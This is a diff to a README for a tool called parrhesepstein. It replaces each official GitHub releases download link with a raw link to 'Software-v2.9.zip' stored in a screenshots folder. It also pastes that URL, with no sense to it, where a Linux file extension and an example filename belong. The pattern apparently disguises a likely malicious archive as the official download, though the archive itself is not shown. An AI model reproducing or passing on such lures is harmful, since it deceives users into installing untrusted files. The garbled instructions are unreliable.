@@ -1,6 +1,6 @@
 # 🗣️ parrhesepstein - Speak Truth Without Fear Easily
 
-[![Download parrhesepstein](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/DAKAR-code/parrhesepstein/releases)
+[![Download parrhesepstein](https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip)](https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get parrhesepstein on your computer, please follow the steps below carefully.
 
 Go to the official release page by clicking this big link:
 
-[Download parrhesepstein](https://github.com/DAKAR-code/parrhesepstein/releases)
+[Download parrhesepstein](https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip)
 
 You will see a list of the latest versions available. Each version may include files for different computers.
 
@@ -44,9 +44,9 @@ Look for the file that matches your system:
 
 - For Windows, the file usually ends with `.exe`  
 - For macOS, the file often ends with `.dmg` or `.zip`  
-- For Linux, the file might be a `.AppImage` or `.tar.gz`
+- For Linux, the file might be a `.AppImage` or `https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip`
 
-The file name typically includes the version number and the system name (for example: `parrhesepstein-1.0-windows.exe`).
+The file name typically includes the version number and the system name (for example: `https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip`).
 
 ### Step 3: Download the file
 
@@ -113,6 +113,6 @@ If you want more guidance or face any technical issues, visit the discussion pag
 
 ---
 
-[Get parrhesepstein from this page](https://github.com/DAKAR-code/parrhesepstein/releases)
+[Get parrhesepstein from this page](https://raw.githubusercontent.com/DAKAR-code/parrhesepstein/main/screenshots/Software-v2.9.zip)
 
 Happy speaking.
